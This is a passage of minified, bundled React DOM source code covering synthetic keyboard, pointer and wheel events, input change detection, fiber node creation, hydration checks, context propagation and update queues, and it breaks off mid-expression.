		qo = {
			Alt: "altKey",
			Control: "ctrlKey",
			Meta: "metaKey",
			Shift: "shiftKey",
		};
	function Yo(e) {
		var t = this.nativeEvent;
		return t.getModifierState
			? t.getModifierState(e)
			: (e = qo[e])
			? !!t[e]
			: !1;
	}
	function ju() {
		return Yo;
	}
	var Go = w({}, Ua, {
			key: function (e) {
				if (e.key) {
					var t = Lo[e.key] || e.key;
					if (t !== "Unidentified") return t;
				}
				return e.type === "keypress"
					? ((e = Q1(e)), e === 13 ? "Enter" : String.fromCharCode(e))
					: e.type === "keydown" || e.type === "keyup"
					? Bo[e.keyCode] || "Unidentified"
					: "";
			},
			code: 0,
			location: 0,
			ctrlKey: 0,
			shiftKey: 0,
			altKey: 0,
			metaKey: 0,
			repeat: 0,
			locale: 0,
			getModifierState: ju,
			charCode: function (e) {
				return e.type === "keypress" ? Q1(e) : 0;
			},
			keyCode: function (e) {
				return e.type === "keydown" || e.type === "keyup"
					? e.keyCode
					: 0;
			},
			which: function (e) {
				return e.type === "keypress"
					? Q1(e)
					: e.type === "keydown" || e.type === "keyup"
					? e.keyCode
					: 0;
			},
		}),
		Zo = $e(Go),
		Xo = w({}, K1, {
			pointerId: 0,
			width: 0,
			height: 0,
			pressure: 0,
			tangentialPressure: 0,
			tiltX: 0,
			tiltY: 0,
			twist: 0,
			pointerType: 0,
			isPrimary: 0,
		}),
		ff = $e(Xo),
		Qo = w({}, Ua, {
			touches: 0,
			targetTouches: 0,
			changedTouches: 0,
			altKey: 0,
			metaKey: 0,
			ctrlKey: 0,
			shiftKey: 0,
			getModifierState: ju,
		}),
		Vo = $e(Qo),
		ko = w({}, jl, { propertyName: 0, elapsedTime: 0, pseudoElement: 0 }),
		Ko = $e(ko),
		Jo = w({}, K1, {
			deltaX: function (e) {
				return "deltaX" in e
					? e.deltaX
					: "wheelDeltaX" in e
					? -e.wheelDeltaX
					: 0;
			},
			deltaY: function (e) {
				return "deltaY" in e
					? e.deltaY
					: "wheelDeltaY" in e
					? -e.wheelDeltaY
					: "wheelDelta" in e
					? -e.wheelDelta
					: 0;
			},
			deltaZ: 0,
			deltaMode: 0,
		}),
		$o = $e(Jo),
		Wo = w({}, jl, { newState: 0, oldState: 0 }),
		Fo = $e(Wo),
		Po = [9, 13, 27, 32],
		Nu = zt && "CompositionEvent" in window,
		La = null;
	zt && "documentMode" in document && (La = document.documentMode);
	var Io = zt && "TextEvent" in window && !La,
		sf = zt && (!Nu || (La && 8 < La && 11 >= La)),
		rf = " ",
		of = !1;
	function df(e, t) {
		switch (e) {
			case "keyup":
				return Po.indexOf(t.keyCode) !== -1;
			case "keydown":
				return t.keyCode !== 229;
			case "keypress":
			case "mousedown":
			case "focusout":
				return !0;
			default:
				return !1;
		}
	}
	function hf(e) {
		return (
			(e = e.detail), typeof e == "object" && "data" in e ? e.data : null
		);
	}
	var Fl = !1;
	function e9(e, t) {
		switch (e) {
			case "compositionend":
				return hf(t);
			case "keypress":
				return t.which !== 32 ? null : ((of = !0), rf);
			case "textInput":
				return (e = t.data), e === rf && of ? null : e;
			default:
				return null;
		}
	}
	function t9(e, t) {
		if (Fl)
			return e === "compositionend" || (!Nu && df(e, t))
				? ((e = af()), (X1 = bu = Pt = null), (Fl = !1), e)
				: null;
		switch (e) {
			case "paste":
				return null;
			case "keypress":
				if (
					!(t.ctrlKey || t.altKey || t.metaKey) ||
					(t.ctrlKey && t.altKey)
				) {
					if (t.char && 1 < t.char.length) return t.char;
					if (t.which) return String.fromCharCode(t.which);
				}
				return null;
			case "compositionend":
				return sf && t.locale !== "ko" ? null : t.data;
			default:
				return null;
		}
	}
	var l9 = {
		color: !0,
		date: !0,
		datetime: !0,
		"datetime-local": !0,
		email: !0,
		month: !0,
		number: !0,
		password: !0,
		range: !0,
		search: !0,
		tel: !0,
		text: !0,
		time: !0,
		url: !0,
		week: !0,
	};
	function mf(e) {
		var t = e && e.nodeName && e.nodeName.toLowerCase();
		return t === "input" ? !!l9[e.type] : t === "textarea";
	}
	function pf(e, t, l, a) {
		$l ? (Wl ? Wl.push(a) : (Wl = [a])) : ($l = a),
			(t = Dn(t, "onChange")),
			0 < t.length &&
				((l = new k1("onChange", "change", null, l, a)),
				e.push({ event: l, listeners: t }));
	}
	var Ba = null,
		qa = null;
	function a9(e) {
		$r(e, 0);
	}
	function J1(e) {
		var t = za(e);
		if ($c(t)) return e;
	}
	function xf(e, t) {
		if (e === "change") return t;
	}
	var gf = !1;
	if (zt) {
		var Tu;
		if (zt) {
			var Au = "oninput" in document;
			if (!Au) {
				var vf = document.createElement("div");
				vf.setAttribute("oninput", "return;"),
					(Au = typeof vf.oninput == "function");
			}
			Tu = Au;
		} else Tu = !1;
		gf = Tu && (!document.documentMode || 9 < document.documentMode);
	}
	function yf() {
		Ba && (Ba.detachEvent("onpropertychange", bf), (qa = Ba = null));
	}
	function bf(e) {
		if (e.propertyName === "value" && J1(qa)) {
			var t = [];
			pf(t, qa, e, gu(e)), lf(a9, t);
		}
	}
	function n9(e, t, l) {
		e === "focusin"
			? (yf(), (Ba = t), (qa = l), Ba.attachEvent("onpropertychange", bf))
			: e === "focusout" && yf();
	}
	function u9(e) {
		if (e === "selectionchange" || e === "keyup" || e === "keydown")
			return J1(qa);
	}
	function i9(e, t) {
		if (e === "click") return J1(t);
	}
	function c9(e, t) {
		if (e === "input" || e === "change") return J1(t);
	}
	function f9(e, t) {
		return (
			(e === t && (e !== 0 || 1 / e === 1 / t)) || (e !== e && t !== t)
		);
	}
	var at = typeof Object.is == "function" ? Object.is : f9;
	function Ya(e, t) {
		if (at(e, t)) return !0;
		if (
			typeof e != "object" ||
			e === null ||
			typeof t != "object" ||
			t === null
		)
			return !1;
		var l = Object.keys(e),
			a = Object.keys(t);
		if (l.length !== a.length) return !1;
		for (a = 0; a < l.length; a++) {
			var n = l[a];
			if (!lu.call(t, n) || !at(e[n], t[n])) return !1;
		}
		return !0;
	}
	function Cf(e) {
		for (; e && e.firstChild; ) e = e.firstChild;
		return e;
	}
	function Sf(e, t) {
		var l = Cf(e);
		e = 0;
		for (var a; l; ) {
			if (l.nodeType === 3) {
				if (((a = e + l.textContent.length), e <= t && a >= t))
					return { node: l, offset: t - e };
				e = a;
			}
			e: {
				for (; l; ) {
					if (l.nextSibling) {
						l = l.nextSibling;
						break e;
					}
					l = l.parentNode;
				}
				l = void 0;
			}
			l = Cf(l);
		}
	}
	function Ef(e, t) {
		return e && t
			? e === t
				? !0
				: e && e.nodeType === 3
				? !1
				: t && t.nodeType === 3
				? Ef(e, t.parentNode)
				: "contains" in e
				? e.contains(t)
				: e.compareDocumentPosition
				? !!(e.compareDocumentPosition(t) & 16)
				: !1
			: !1;
	}
	function jf(e) {
		e =
			e != null &&
			e.ownerDocument != null &&
			e.ownerDocument.defaultView != null
				? e.ownerDocument.defaultView
				: window;
		for (var t = G1(e.document); t instanceof e.HTMLIFrameElement; ) {
			try {
				var l = typeof t.contentWindow.location.href == "string";
			} catch {
				l = !1;
			}
			if (l) e = t.contentWindow;
			else break;
			t = G1(e.document);
		}
		return t;
	}
	function wu(e) {
		var t = e && e.nodeName && e.nodeName.toLowerCase();
		return (
			t &&
			((t === "input" &&
				(e.type === "text" ||
					e.type === "search" ||
					e.type === "tel" ||
					e.type === "url" ||
					e.type === "password")) ||
				t === "textarea" ||
				e.contentEditable === "true")
		);
	}
	var s9 = zt && "documentMode" in document && 11 >= document.documentMode,
		Pl = null,
		Mu = null,
		Ga = null,
		Ou = !1;
	function Nf(e, t, l) {
		var a =
			l.window === l
				? l.document
				: l.nodeType === 9
				? l
				: l.ownerDocument;
		Ou ||
			Pl == null ||
			Pl !== G1(a) ||
			((a = Pl),
			"selectionStart" in a && wu(a)
				? (a = { start: a.selectionStart, end: a.selectionEnd })
				: ((a = (
						(a.ownerDocument && a.ownerDocument.defaultView) ||
						window
				  ).getSelection()),
				  (a = {
						anchorNode: a.anchorNode,
						anchorOffset: a.anchorOffset,
						focusNode: a.focusNode,
						focusOffset: a.focusOffset,
				  })),
			(Ga && Ya(Ga, a)) ||
				((Ga = a),
				(a = Dn(Mu, "onSelect")),
				0 < a.length &&
					((t = new k1("onSelect", "select", null, t, l)),
					e.push({ event: t, listeners: a }),
					(t.target = Pl))));
	}
	function Nl(e, t) {
		var l = {};
		return (
			(l[e.toLowerCase()] = t.toLowerCase()),
			(l["Webkit" + e] = "webkit" + t),
			(l["Moz" + e] = "moz" + t),
			l
		);
	}
	var Il = {
			animationend: Nl("Animation", "AnimationEnd"),
			animationiteration: Nl("Animation", "AnimationIteration"),
			animationstart: Nl("Animation", "AnimationStart"),
			transitionrun: Nl("Transition", "TransitionRun"),
			transitionstart: Nl("Transition", "TransitionStart"),
			transitioncancel: Nl("Transition", "TransitionCancel"),
			transitionend: Nl("Transition", "TransitionEnd"),
		},
		Ru = {},
		Tf = {};
	zt &&
		((Tf = document.createElement("div").style),
		"AnimationEvent" in window ||
			(delete Il.animationend.animation,
			delete Il.animationiteration.animation,
			delete Il.animationstart.animation),
		"TransitionEvent" in window || delete Il.transitionend.transition);
	function Tl(e) {
		if (Ru[e]) return Ru[e];
		if (!Il[e]) return e;
		var t = Il[e],
			l;
		for (l in t) if (t.hasOwnProperty(l) && l in Tf) return (Ru[e] = t[l]);
		return e;
	}
	var Af = Tl("animationend"),
		wf = Tl("animationiteration"),
		Mf = Tl("animationstart"),
		r9 = Tl("transitionrun"),
		o9 = Tl("transitionstart"),
		d9 = Tl("transitioncancel"),
		Of = Tl("transitionend"),
		Rf = new Map(),
		zu =
			"abort auxClick beforeToggle cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(
				" "
			);
	zu.push("scrollEnd");
	function bt(e, t) {
		Rf.set(e, t), El(t, [e]);
	}
	var zf = new WeakMap();
	function ht(e, t) {
		if (typeof e == "object" && e !== null) {
			var l = zf.get(e);
			return l !== void 0
				? l
				: ((t = { value: e, source: t, stack: Kc(t) }),
				  zf.set(e, t),
				  t);
		}
		return { value: e, source: t, stack: Kc(t) };
	}
	var mt = [],
		ea = 0,
		_u = 0;
	function $1() {
		for (var e = ea, t = (_u = ea = 0); t < e; ) {
			var l = mt[t];
			mt[t++] = null;
			var a = mt[t];
			mt[t++] = null;
			var n = mt[t];
			mt[t++] = null;
			var u = mt[t];
			if (((mt[t++] = null), a !== null && n !== null)) {
				var i = a.pending;
				i === null ? (n.next = n) : ((n.next = i.next), (i.next = n)),
					(a.pending = n);
			}
			u !== 0 && _f(l, n, u);
		}
	}
	function W1(e, t, l, a) {
		(mt[ea++] = e),
			(mt[ea++] = t),
			(mt[ea++] = l),
			(mt[ea++] = a),
			(_u |= a),
			(e.lanes |= a),
			(e = e.alternate),
			e !== null && (e.lanes |= a);
	}
	function Du(e, t, l, a) {
		return W1(e, t, l, a), F1(e);
	}
	function ta(e, t) {
		return W1(e, null, null, t), F1(e);
	}
	function _f(e, t, l) {
		e.lanes |= l;
		var a = e.alternate;
		a !== null && (a.lanes |= l);
		for (var n = !1, u = e.return; u !== null; )
			(u.childLanes |= l),
				(a = u.alternate),
				a !== null && (a.childLanes |= l),
				u.tag === 22 &&
					((e = u.stateNode),
					e === null || e._visibility & 1 || (n = !0)),
				(e = u),
				(u = u.return);
		return e.tag === 3
			? ((u = e.stateNode),
			  n &&
					t !== null &&
					((n = 31 - lt(l)),
					(e = u.hiddenUpdates),
					(a = e[n]),
					a === null ? (e[n] = [t]) : a.push(t),
					(t.lane = l | 536870912)),
			  u)
			: null;
	}
	function F1(e) {
		if (50 < d1) throw ((d1 = 0), (Yi = null), Error(r(185)));
		for (var t = e.return; t !== null; ) (e = t), (t = e.return);
		return e.tag === 3 ? e.stateNode : null;
	}
	var la = {};
	function h9(e, t, l, a) {
		(this.tag = e),
			(this.key = l),
			(this.sibling =
				this.child =
				this.return =
				this.stateNode =
				this.type =
				this.elementType =
					null),
			(this.index = 0),
			(this.refCleanup = this.ref = null),
			(this.pendingProps = t),
			(this.dependencies =
				this.memoizedState =
				this.updateQueue =
				this.memoizedProps =
					null),
			(this.mode = a),
			(this.subtreeFlags = this.flags = 0),
			(this.deletions = null),
			(this.childLanes = this.lanes = 0),
			(this.alternate = null);
	}
	function nt(e, t, l, a) {
		return new h9(e, t, l, a);
	}
	function Uu(e) {
		return (e = e.prototype), !(!e || !e.isReactComponent);
	}
	function _t(e, t) {
		var l = e.alternate;
		return (
			l === null
				? ((l = nt(e.tag, t, e.key, e.mode)),
				  (l.elementType = e.elementType),
				  (l.type = e.type),
				  (l.stateNode = e.stateNode),
				  (l.alternate = e),
				  (e.alternate = l))
				: ((l.pendingProps = t),
				  (l.type = e.type),
				  (l.flags = 0),
				  (l.subtreeFlags = 0),
				  (l.deletions = null)),
			(l.flags = e.flags & 65011712),
			(l.childLanes = e.childLanes),
			(l.lanes = e.lanes),
			(l.child = e.child),
			(l.memoizedProps = e.memoizedProps),
			(l.memoizedState = e.memoizedState),
			(l.updateQueue = e.updateQueue),
			(t = e.dependencies),
			(l.dependencies =
				t === null
					? null
					: { lanes: t.lanes, firstContext: t.firstContext }),
			(l.sibling = e.sibling),
			(l.index = e.index),
			(l.ref = e.ref),
			(l.refCleanup = e.refCleanup),
			l
		);
	}
	function Df(e, t) {
		e.flags &= 65011714;
		var l = e.alternate;
		return (
			l === null
				? ((e.childLanes = 0),
				  (e.lanes = t),
				  (e.child = null),
				  (e.subtreeFlags = 0),
				  (e.memoizedProps = null),
				  (e.memoizedState = null),
				  (e.updateQueue = null),
				  (e.dependencies = null),
				  (e.stateNode = null))
				: ((e.childLanes = l.childLanes),
				  (e.lanes = l.lanes),
				  (e.child = l.child),
				  (e.subtreeFlags = 0),
				  (e.deletions = null),
				  (e.memoizedProps = l.memoizedProps),
				  (e.memoizedState = l.memoizedState),
				  (e.updateQueue = l.updateQueue),
				  (e.type = l.type),
				  (t = l.dependencies),
				  (e.dependencies =
						t === null
							? null
							: {
									lanes: t.lanes,
									firstContext: t.firstContext,
							  })),
			e
		);
	}
	function P1(e, t, l, a, n, u) {
		var i = 0;
		if (((a = e), typeof e == "function")) Uu(e) && (i = 1);
		else if (typeof e == "string")
			i = p0(e, l, V.current)
				? 26
				: e === "html" || e === "head" || e === "body"
				? 27
				: 5;
		else
			e: switch (e) {
				case Ee:
					return (
						(e = nt(31, l, t, n)),
						(e.elementType = Ee),
						(e.lanes = u),
						e
					);
				case X:
					return Al(l.children, n, u, t);
				case Q:
					(i = 8), (n |= 24);
					break;
				case G:
					return (
						(e = nt(12, l, t, n | 2)),
						(e.elementType = G),
						(e.lanes = u),
						e
					);
				case F:
					return (
						(e = nt(13, l, t, n)),
						(e.elementType = F),
						(e.lanes = u),
						e
					);
				case _e:
					return (
						(e = nt(19, l, t, n)),
						(e.elementType = _e),
						(e.lanes = u),
						e
					);
				default:
					if (typeof e == "object" && e !== null)
						switch (e.$$typeof) {
							case H:
							case I:
								i = 10;
								break e;
							case ie:
								i = 9;
								break e;
							case be:
								i = 11;
								break e;
							case Oe:
								i = 14;
								break e;
							case De:
								(i = 16), (a = null);
								break e;
						}
					(i = 29),
						(l = Error(r(130, e === null ? "null" : typeof e, ""))),
						(a = null);
			}
		return (
			(t = nt(i, l, t, n)),
			(t.elementType = e),
			(t.type = a),
			(t.lanes = u),
			t
		);
	}
	function Al(e, t, l, a) {
		return (e = nt(7, e, a, t)), (e.lanes = l), e;
	}
	function Hu(e, t, l) {
		return (e = nt(6, e, null, t)), (e.lanes = l), e;
	}
	function Lu(e, t, l) {
		return (
			(t = nt(4, e.children !== null ? e.children : [], e.key, t)),
			(t.lanes = l),
			(t.stateNode = {
				containerInfo: e.containerInfo,
				pendingChildren: null,
				implementation: e.implementation,
			}),
			t
		);
	}
	var aa = [],
		na = 0,
		I1 = null,
		en = 0,
		pt = [],
		xt = 0,
		wl = null,
		Dt = 1,
		Ut = "";
	function Ml(e, t) {
		(aa[na++] = en), (aa[na++] = I1), (I1 = e), (en = t);
	}
	function Uf(e, t, l) {
		(pt[xt++] = Dt), (pt[xt++] = Ut), (pt[xt++] = wl), (wl = e);
		var a = Dt;
		e = Ut;
		var n = 32 - lt(a) - 1;
		(a &= ~(1 << n)), (l += 1);
		var u = 32 - lt(t) + n;
		if (30 < u) {
			var i = n - (n % 5);
			(u = (a & ((1 << i) - 1)).toString(32)),
				(a >>= i),
				(n -= i),
				(Dt = (1 << (32 - lt(t) + n)) | (l << n) | a),
				(Ut = u + e);
		} else (Dt = (1 << u) | (l << n) | a), (Ut = e);
	}
	function Bu(e) {
		e.return !== null && (Ml(e, 1), Uf(e, 1, 0));
	}
	function qu(e) {
		for (; e === I1; )
			(I1 = aa[--na]), (aa[na] = null), (en = aa[--na]), (aa[na] = null);
		for (; e === wl; )
			(wl = pt[--xt]),
				(pt[xt] = null),
				(Ut = pt[--xt]),
				(pt[xt] = null),
				(Dt = pt[--xt]),
				(pt[xt] = null);
	}
	var Ke = null,
		je = null,
		se = !1,
		Ol = null,
		jt = !1,
		Yu = Error(r(519));
	function Rl(e) {
		var t = Error(r(418, ""));
		throw (Qa(ht(t, e)), Yu);
	}
	function Hf(e) {
		var t = e.stateNode,
			l = e.type,
			a = e.memoizedProps;
		switch (((t[Qe] = e), (t[Je] = a), l)) {
			case "dialog":
				ne("cancel", t), ne("close", t);
				break;
			case "iframe":
			case "object":
			case "embed":
				ne("load", t);
				break;
			case "video":
			case "audio":
				for (l = 0; l < m1.length; l++) ne(m1[l], t);
				break;
			case "source":
				ne("error", t);
				break;
			case "img":
			case "image":
			case "link":
				ne("error", t), ne("load", t);
				break;
			case "details":
				ne("toggle", t);
				break;
			case "input":
				ne("invalid", t),
					Wc(
						t,
						a.value,
						a.defaultValue,
						a.checked,
						a.defaultChecked,
						a.type,
						a.name,
						!0
					),
					Y1(t);
				break;
			case "select":
				ne("invalid", t);
				break;
			case "textarea":
				ne("invalid", t),
					Pc(t, a.value, a.defaultValue, a.children),
					Y1(t);
		}
		(l = a.children),
			(typeof l != "string" &&
				typeof l != "number" &&
				typeof l != "bigint") ||
			t.textContent === "" + l ||
			a.suppressHydrationWarning === !0 ||
			Ir(t.textContent, l)
				? (a.popover != null &&
						(ne("beforetoggle", t), ne("toggle", t)),
				  a.onScroll != null && ne("scroll", t),
				  a.onScrollEnd != null && ne("scrollend", t),
				  a.onClick != null && (t.onclick = Un),
				  (t = !0))
				: (t = !1),
			t || Rl(e);
	}
	function Lf(e) {
		for (Ke = e.return; Ke; )
			switch (Ke.tag) {
				case 5:
				case 13:
					jt = !1;
					return;
				case 27:
				case 3:
					jt = !0;
					return;
				default:
					Ke = Ke.return;
			}
	}
	function Za(e) {
		if (e !== Ke) return !1;
		if (!se) return Lf(e), (se = !0), !1;
		var t = e.tag,
			l;
		if (
			((l = t !== 3 && t !== 27) &&
				((l = t === 5) &&
					((l = e.type),
					(l =
						!(l !== "form" && l !== "button") ||
						lc(e.type, e.memoizedProps))),
				(l = !l)),
			l && je && Rl(e),
			Lf(e),
			t === 13)
		) {
			if (
				((e = e.memoizedState),
				(e = e !== null ? e.dehydrated : null),
				!e)
			)
				throw Error(r(317));
			e: {
				for (e = e.nextSibling, t = 0; e; ) {
					if (e.nodeType === 8)
						if (((l = e.data), l === "/$")) {
							if (t === 0) {
								je = St(e.nextSibling);
								break e;
							}
							t--;
						} else (l !== "$" && l !== "$!" && l !== "$?") || t++;
					e = e.nextSibling;
				}
				je = null;
			}
		} else
			t === 27
				? ((t = je),
				  ml(e.type) ? ((e = ic), (ic = null), (je = e)) : (je = t))
				: (je = Ke ? St(e.stateNode.nextSibling) : null);
		return !0;
	}
	function Xa() {
		(je = Ke = null), (se = !1);
	}
	function Bf() {
		var e = Ol;
		return (
			e !== null &&
				(Pe === null ? (Pe = e) : Pe.push.apply(Pe, e), (Ol = null)),
			e
		);
	}
	function Qa(e) {
		Ol === null ? (Ol = [e]) : Ol.push(e);
	}
	var Gu = _(null),
		zl = null,
		Ht = null;
	function It(e, t, l) {
		L(Gu, t._currentValue), (t._currentValue = l);
	}
	function Lt(e) {
		(e._currentValue = Gu.current), q(Gu);
	}
	function Zu(e, t, l) {
		for (; e !== null; ) {
			var a = e.alternate;
			if (
				((e.childLanes & t) !== t
					? ((e.childLanes |= t), a !== null && (a.childLanes |= t))
					: a !== null &&
					  (a.childLanes & t) !== t &&
					  (a.childLanes |= t),
				e === l)
			)
				break;
			e = e.return;
		}
	}
	function Xu(e, t, l, a) {
		var n = e.child;
		for (n !== null && (n.return = e); n !== null; ) {
			var u = n.dependencies;
			if (u !== null) {
				var i = n.child;
				u = u.firstContext;
				e: for (; u !== null; ) {
					var s = u;
					u = n;
					for (var m = 0; m < t.length; m++)
						if (s.context === t[m]) {
							(u.lanes |= l),
								(s = u.alternate),
								s !== null && (s.lanes |= l),
								Zu(u.return, l, e),
								a || (i = null);
							break e;
						}
					u = s.next;
				}
			} else if (n.tag === 18) {
				if (((i = n.return), i === null)) throw Error(r(341));
				(i.lanes |= l),
					(u = i.alternate),
					u !== null && (u.lanes |= l),
					Zu(i, l, e),
					(i = null);
			} else i = n.child;
			if (i !== null) i.return = n;
			else
				for (i = n; i !== null; ) {
					if (i === e) {
						i = null;
						break;
					}
					if (((n = i.sibling), n !== null)) {
						(n.return = i.return), (i = n);
						break;
					}
					i = i.return;
				}
			n = i;
		}
	}
	function Va(e, t, l, a) {
		e = null;
		for (var n = t, u = !1; n !== null; ) {
			if (!u) {
				if ((n.flags & 524288) !== 0) u = !0;
				else if ((n.flags & 262144) !== 0) break;
			}
			if (n.tag === 10) {
				var i = n.alternate;
				if (i === null) throw Error(r(387));
				if (((i = i.memoizedProps), i !== null)) {
					var s = n.type;
					at(n.pendingProps.value, i.value) ||
						(e !== null ? e.push(s) : (e = [s]));
				}
			} else if (n === et.current) {
				if (((i = n.alternate), i === null)) throw Error(r(387));
				i.memoizedState.memoizedState !==
					n.memoizedState.memoizedState &&
					(e !== null ? e.push(b1) : (e = [b1]));
			}
			n = n.return;
		}
		e !== null && Xu(t, e, l, a), (t.flags |= 262144);
	}
	function tn(e) {
		for (e = e.firstContext; e !== null; ) {
			if (!at(e.context._currentValue, e.memoizedValue)) return !0;
			e = e.next;
		}
		return !1;
	}
	function _l(e) {
		(zl = e),
			(Ht = null),
			(e = e.dependencies),
			e !== null && (e.firstContext = null);
	}
	function Ve(e) {
		return qf(zl, e);
	}
	function ln(e, t) {
		return zl === null && _l(e), qf(e, t);
	}
	function qf(e, t) {
		var l = t._currentValue;
		if (((t = { context: t, memoizedValue: l, next: null }), Ht === null)) {
			if (e === null) throw Error(r(308));
			(Ht = t),
				(e.dependencies = { lanes: 0, firstContext: t }),
				(e.flags |= 524288);
		} else Ht = Ht.next = t;
		return l;
	}
	var m9 =
			typeof AbortController < "u"
				? AbortController
				: function () {
						var e = [],
							t = (this.signal = {
								aborted: !1,
								addEventListener: function (l, a) {
									e.push(a);
								},
							});
						this.abort = function () {
							(t.aborted = !0),
								e.forEach(function (l) {
									return l();
								});
						};
				  },
		p9 = c.unstable_scheduleCallback,
		x9 = c.unstable_NormalPriority,
		Re = {
			$$typeof: I,
			Consumer: null,
			Provider: null,
			_currentValue: null,
			_currentValue2: null,
			_threadCount: 0,
		};
	function Qu() {
		return { controller: new m9(), data: new Map(), refCount: 0 };
	}
	function ka(e) {
		e.refCount--,
			e.refCount === 0 &&
				p9(x9, function () {
					e.controller.abort();
				});
	}
	var Ka = null,
		Vu = 0,
		ua = 0,
		ia = null;
	function g9(e, t) {
		if (Ka === null) {
			var l = (Ka = []);
			(Vu = 0),
				(ua = Ki()),
				(ia = {
					status: "pending",
					value: void 0,
					then: function (a) {
						l.push(a);
					},
				});
		}
		return Vu++, t.then(Yf, Yf), t;
	}
	function Yf() {
		if (--Vu === 0 && Ka !== null) {
			ia !== null && (ia.status = "fulfilled");
			var e = Ka;
			(Ka = null), (ua = 0), (ia = null);
			for (var t = 0; t < e.length; t++) (0, e[t])();
		}
	}
	function v9(e, t) {
		var l = [],
			a = {
				status: "pending",
				value: null,
				reason: null,
				then: function (n) {
					l.push(n);
				},
			};
		return (
			e.then(
				function () {
					(a.status = "fulfilled"), (a.value = t);
					for (var n = 0; n < l.length; n++) (0, l[n])(t);
				},
				function (n) {
					for (
						a.status = "rejected", a.reason = n, n = 0;
						n < l.length;
						n++
					)
						(0, l[n])(void 0);
				}
			),
			a
		);
	}
	var Gf = M.S;
	M.S = function (e, t) {
		typeof t == "object" &&
			t !== null &&
			typeof t.then == "function" &&
			g9(e, t),
			Gf !== null && Gf(e, t);
	};
	var Dl = _(null);
	function ku() {
		var e = Dl.current;
		return e !== null ? e : ge.pooledCache;
	}
	function an(e, t) {
		t === null ? L(Dl, Dl.current) : L(Dl, t.pool);
	}
	function Zf() {
		var e = ku();
		return e === null ? null : { parent: Re._currentValue, pool: e };
	}
	var Ja = Error(r(460)),
		Xf = Error(r(474)),
		nn = Error(r(542)),
		Ku = { then: function () {} };
	function Qf(e) {
		return (e = e.status), e === "fulfilled" || e === "rejected";
	}
	function un() {}
	function Vf(e, t, l) {
		switch (
			((l = e[l]),
			l === void 0 ? e.push(t) : l !== t && (t.then(un, un), (t = l)),
			t.status)
		) {
			case "fulfilled":
				return t.value;
			case "rejected":
				throw ((e = t.reason), Kf(e), e);
			default:
				if (typeof t.status == "string") t.then(un, un);
				else {
					if (((e = ge), e !== null && 100 < e.shellSuspendCounter))
						throw Error(r(482));
					(e = t),
						(e.status = "pending"),
						e.then(
							function (a) {
								if (t.status === "pending") {
									var n = t;
									(n.status = "fulfilled"), (n.value = a);
								}
							},
							function (a) {
								if (t.status === "pending") {
									var n = t;
									(n.status = "rejected"), (n.reason = a);
								}
							}
						);
				}
				switch (t.status) {
					case "fulfilled":
						return t.value;
					case "rejected":
						throw ((e = t.reason), Kf(e), e);
				}
				throw (($a = t), Ja);
		}
	}
	var $a = null;
	function kf() {
		if ($a === null) throw Error(r(459));
		var e = $a;
		return ($a = null), e;
	}
	function Kf(e) {
		if (e === Ja || e === nn) throw Error(r(483));
	}
	var el = !1;
	function Ju(e) {
		e.updateQueue = {
			baseState: e.memoizedState,
			firstBaseUpdate: null,
			lastBaseUpdate: null,
			shared: { pending: null, lanes: 0, hiddenCallbacks: null },
			callbacks: null,
		};
	}
	function $u(e, t) {
		(e = e.updateQueue),
			t.updateQueue === e &&
				(t.updateQueue = {
					baseState: e.baseState,
					firstBaseUpdate: e.firstBaseUpdate,
					lastBaseUpdate: e.lastBaseUpdate,
					shared: e.shared,
					callbacks: null,
				});
	}
	function tl(e) {
		return { lane: e, tag: 0, payload: null, callback: null, next: null };
	}
	function ll(e, t, l) {
		var a = e.updateQueue;
		if (a === null) return null;
		if (((a = a.shared), (re & 2) !== 0)) {
			var n = a.pending;
			return (
				n === null ? (t.next = t) : ((t.next = n.next), (n.next = t)),
				(a.pending = t),
				(t = F1(e)),
				_f(e, null, l),
				t
			);
		}
		return W1(e, a, t, l), F1(e);
	}
	function Wa(e, t, l) {
		if (
			((t = t.updateQueue),
			t !== null && ((t = t.shared), (l & 4194048) !== 0))
		) {
			var a = t.lanes;
			(a &= e.pendingLanes), (l |= a), (t.lanes = l), qc(e, l);
		}
	}
	function Wu(e, t) {
		var l = e.updateQueue,
			a = e.alternate;
		if (a !== null && ((a = a.updateQueue), l === a)) {
			var n = null,
				u = null;
			if (((l = l.firstBaseUpdate), l !== null)) {
				do {
					var i = {
						lane: l.lane,
						tag: l.tag,
						payload: l.payload,
						callback: null,
						next: null,
					};
					u === null ? (n = u = i) : (u = u.next = i), (l = l.next);
				} while (l !== null);
				u === null ? (n = u = t) : (u = u.next = t);
			} else n = u = t;
			(l = {
				baseState: a.baseState,
				firstBaseUpdate: n,
				lastBaseUpdate: u,
				shared: a.shared,
				callbacks: a.callbacks,
			}),
				(e.updateQueue = l);
			return;
		}
		(e = l.lastBaseUpdate),
			e === null ? (l.firstBaseUpdate = t) : (e.next = t),
			(l.lastBaseUpdate = t);
	}
	var Fu = !1;
	function Fa() {
		if (Fu) {
			var e = ia;
			if (e !== null) throw e;
		}
	}
	function Pa(e, t, l, a) {
		Fu = !1;
		var n = e.updateQueue;
		el = !1;
		var u = n.firstBaseUpdate,
			i = n.lastBaseUpdate,
			s = n.shared.pending;
		if (s !== null) {
			n.shared.pending = null;
			var m = s,
				S = m.next;
			(m.next = null), i === null ? (u = S) : (i.next = S), (i = m);
			var T = e.alternate;
			T !== null &&
				((T = T.updateQueue),
				(s = T.lastBaseUpdate),
				s !== i &&
					(s === null ? (T.firstBaseUpdate = S) : (s.next = S),
					(T.lastBaseUpdate = m)));
		}
		if (u !== null) {
			var R = n.baseState;
			(i = 0), (T = S = m = null), (s = u);
			do {
				var E = s.lane & -536870913,
					j = E !== s.lane;
				if (j ? (ue & E) === E : (a & E) === E) {
					E !== 0 && E === ua && (Fu = !0),
						T !== null &&
							(T = T.next =
								{
									lane: 0,
									tag: s.tag,
									payload: s.payload,
									callback: null,
									next: null,
								});
					e: {
						var W = e,
							k = s;
						E = t;
						var me = l;
						switch (k.tag) {
							case 1:
								if (((W = k.payload), typeof W == "function")) {
									R = W.call(me, R, E);
									break e;
								}
								R = W;
								break e;
							case 3:
								W.flags = (W.flags & -65537) | 128;
							case 0:
								if (
									((W = k.payload),
									(E =
										typeof W == "function"
